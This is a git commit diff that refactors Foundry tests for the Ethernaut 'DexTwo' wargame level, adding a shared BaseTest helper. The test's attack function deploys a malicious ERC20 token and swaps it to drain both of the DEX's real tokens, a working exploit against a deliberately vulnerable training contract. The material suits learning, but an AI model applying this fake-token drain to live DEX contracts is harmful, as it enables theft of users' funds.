249a173304bdf744705254d2e6e309b11164c329
karooolis <hello@karolisram.com>
2023-04-29 18:30:01 +0300

    add BaseTest helper

--- test/23-DexTwo.t.sol
+++ test/23-DexTwo.t.sol
@@ -2,33 +2,32 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
+import "./utils/BaseTest.sol";
 import "../src/Ethernaut.sol";
 import "../src/levels/23-DexTwo/DexTwo.sol";
 import "../src/levels/23-DexTwo/DexTwoFactory.sol";
 
-contract DexTwoTest is Test {
-    Ethernaut public ethernaut;
-    DexTwoFactory public dexTwoFactory;
-    DexTwo public dexTwo;
-    address internal levelAddr;
+contract DexTwoTest is Test, BaseTest {
+    DexTwo public level;
 
-    address attacker = address(0x1);
+    constructor() {
+        levelFactory = new DexTwoFactory();
+    }
 
-    function setUp() public {
-        vm.deal(attacker, 10_000 ether);
-
-        ethernaut = new Ethernaut();
-        dexTwoFactory = new DexTwoFactory();
-        ethernaut.registerLevel(dexTwoFactory);
-
-        vm.startPrank(attacker);
-        levelAddr = ethernaut.createLevelInstance(dexTwoFactory);
-        dexTwo = DexTwo(payable(levelAddr));
+    function setUp() public override {
+        super.setUp();
+        levelAddr = payable(_createLevelInstance());
+        level = DexTwo(levelAddr);
     }
 
     function testAttack() public {
-        address token1 = dexTwo.token1();
-        address token2 = dexTwo.token2();
+        _attack();
+        _validateLevel();
+    }
+
+    function _attack() internal override {
+        address token1 = level.token1();
+        address token2 = level.token2();
 
         IERC20 maliciousToken = new SwappableTokenTwo(
             attacker,
@@ -37,14 +36,11 @@ contract DexTwoTest is Test {
             1000
         );
 
-        maliciousToken.approve(address(dexTwo), 100);
-        maliciousToken.transfer(address(dexTwo), 100);
-        dexTwo.swap(address(maliciousToken), token1, 100);
+        maliciousToken.approve(address(level), 100);
+        maliciousToken.transfer(address(level), 100);
+        level.swap(address(maliciousToken), token1, 100);
 
-        maliciousToken.approve(address(dexTwo), 200);
-        dexTwo.swap(address(maliciousToken), token2, 200);
-
-        bool success = ethernaut.submitLevelInstance(payable(levelAddr));
-        assertTrue(success, "Solution is not solving the level");
+        maliciousToken.approve(address(level), 200);
+        level.swap(address(maliciousToken), token2, 200);
     }
 }
---
+++ test/utils/BaseTest.sol
@@ -0,0 +1,38 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+import "../../src/Ethernaut.sol";
+
+contract BaseTest is Test {
+    Ethernaut internal ethernaut;
+    Level internal levelFactory;
+
+    address payable internal levelAddr;
+    address internal attacker;
+
+    function setUp() public virtual {
+        // level setup
+        ethernaut = new Ethernaut();
+        ethernaut.registerLevel(levelFactory);
+
+        // attacker setup
+        attacker = makeAddr("attacker");
+    }
+
+    /// @dev Create a level instance
+    function _createLevelInstance() internal returns (address) {
+        vm.prank(attacker);
+        return ethernaut.createLevelInstance(levelFactory);
+    }
+
+    /// @dev Implement the attack
+    function _attack() internal virtual {}
+
+    /// @dev Validate the level instance
+    function _validateLevel() internal {
+        vm.startPrank(attacker);
+        bool success = ethernaut.submitLevelInstance(payable(levelAddr));
+        assertTrue(success, "Solution is not solving the level");
+    }
+}
